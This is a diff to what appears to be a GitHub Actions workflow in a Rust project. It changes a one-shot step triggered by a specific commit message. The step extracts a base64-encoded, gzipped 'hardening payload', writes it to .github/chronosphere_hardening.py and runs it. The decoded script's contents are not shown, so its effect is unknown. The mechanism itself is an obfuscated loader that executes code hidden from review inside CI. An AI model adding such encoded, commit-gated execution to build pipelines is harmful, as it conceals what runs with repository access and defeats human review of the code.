@@ -28,7 +28,7 @@ jobs:
           components: rustfmt, clippy
       - name: Apply milestones and capture failures
         run: |
-          if [ "$(git log -1 --pretty=%s)" != "chore: capture hardening failure" ]; then
+          if [ "$(git log -1 --pretty=%s)" != "chore: retry hardening implementation" ]; then
             echo "Diagnostic bootstrap already consumed."
             exit 0
           fi
@@ -46,8 +46,9 @@ jobs:
           if match is None:
               raise SystemExit('hardening payload not found')
           payload = ''.join(line.strip() for line in match.group(1).splitlines())
-          script = gzip.decompress(base64.b64decode(payload))
-          Path('.github/chronosphere_hardening.py').write_bytes(script)
+          script = gzip.decompress(base64.b64decode(payload)).decode()
+          script = script.replace("r'''\\\n", "r'''")
+          Path('.github/chronosphere_hardening.py').write_text(script)
           PY
           set +e
           python3 .github/chronosphere_hardening.py > /tmp/hardening.log 2>&1
